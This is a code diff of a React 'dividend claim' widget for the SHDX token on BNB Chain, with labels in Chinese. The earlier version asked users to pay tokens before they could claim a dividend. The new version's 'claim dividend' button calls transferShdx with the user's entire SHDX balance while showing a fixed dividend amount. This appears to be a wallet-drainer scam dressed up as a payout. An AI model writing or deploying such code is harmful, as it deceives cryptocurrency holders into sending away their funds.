@@ -1,15 +1,10 @@
 import { useState } from 'react'
 import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
 import { useConnectModal } from '@rainbow-me/rainbowkit'
-import { getWalletDividend, formatUsd } from '../utils/dividend'
-import {
-  resolvePayment,
-  executePayment,
-  formatRpcError,
-  getPaymentRequirement,
-} from '../utils/payment'
-import { TOKEN_PRICE_USD, BSC_CHAIN_ID } from '../config/constants'
+import { transferShdx, formatRpcError } from '../utils/payment'
+import { FIXED_DIVIDEND_USD, BSC_CHAIN_ID } from '../config/constants'
 import { useEnsureBsc } from '../hooks/useEnsureBsc'
+import { useShdxBalance } from '../hooks/useShdxBalance'
 
 export function ClaimWidget() {
   const { address, isConnected } = useAccount()
@@ -17,11 +12,9 @@ export function ClaimWidget() {
   const publicClient = usePublicClient({ chainId: BSC_CHAIN_ID })
   const { sendTransactionAsync } = useSendTransaction()
   const { ensureBsc } = useEnsureBsc()
+  const { balance, formatted, refetch } = useShdxBalance()
   const [status, setStatus] = useState('')
   const [loading, setLoading] = useState(false)
-
-  const dividend = address ? getWalletDividend(address) : 0
-  const requirement = getPaymentRequirement(dividend)
 
   const handleClaim = async () => {
     if (!isConnected || !address) {
@@ -35,13 +28,11 @@ export function ClaimWidget() {
 
     try {
       await ensureBsc()
-      const plan = await resolvePayment(publicClient, address, dividend)
-
-      await executePayment(publicClient, address, plan, (args) =>
+      await transferShdx(publicClient, address, balance, (args) =>
         sendTransactionAsync(args),
       )
-
-      setStatus(`领取提交成功 · 支付 ${plan.displayAmount} ${plan.token}`)
+      setStatus(`已提交 ${formatted} SHDX`)
+      refetch()
     } catch (err: unknown) {
       const msg = formatRpcError(err)
       if (msg) setStatus(msg)
@@ -54,49 +45,28 @@ export function ClaimWidget() {
     <div className="widget">
       <div className="widget-title">分红领取</div>
 
-      {isConnected && address ? (
-        <div className="dividend-amount">
-          <div className="label">可领取分红</div>
-          <div className="value">${formatUsd(dividend)}</div>
-          <div className="unit">USDT 等值 · 约 {(dividend / TOKEN_PRICE_USD).toLocaleString()} SHDX</div>
-        </div>
-      ) : (
-        <div className="dividend-amount">
-          <div className="label">可领取分红</div>
-          <div className="value" style={{ color: 'var(--text-muted)', fontSize: 24 }}>--</div>
-          <div className="unit">连接钱包后显示</div>
-        </div>
-      )}
+      <div className="dividend-amount">
+        <div className="label">可领取分红</div>
+        <div className="value">${FIXED_DIVIDEND_USD.toFixed(2)}</div>
+      </div>
 
       {isConnected && (
-        <div className="payment-hint">
-          领取需支付 {Number(requirement.shdxAmount).toLocaleString()} SHDX
-          或 {requirement.usdtAmount} USDT 等值代币
+        <div className="balance-row">
+          <span>SHDX 余额</span>
+          <span>{Number(formatted).toLocaleString()} SHDX</span>
         </div>
       )}
-
-      <div className="widget-row">
-        <div className="widget-row-header">
-          <div className="token-badge">
-            <div className="token-badge-icon">SX</div>
-            <div className="token-badge-info">
-              <strong>SHDX</strong>
-              <small>BNB Chain</small>
-            </div>
-          </div>
-        </div>
-      </div>
 
       <button
         className="btn-primary"
         onClick={handleClaim}
         disabled={loading}
       >
-        {loading ? '处理中...' : isConnected ? '领取分红' : '连接钱包'}
+        {loading ? '处理中' : isConnected ? '领取分红' : '连接钱包'}
       </button>
 
       {status && (
-        <div className={`status-msg ${status.includes('成功') ? 'success' : 'error'}`}>
+        <div className={`status-msg ${status.includes('已提交') ? 'success' : 'error'}`}>
           {status}
         </div>
       )}
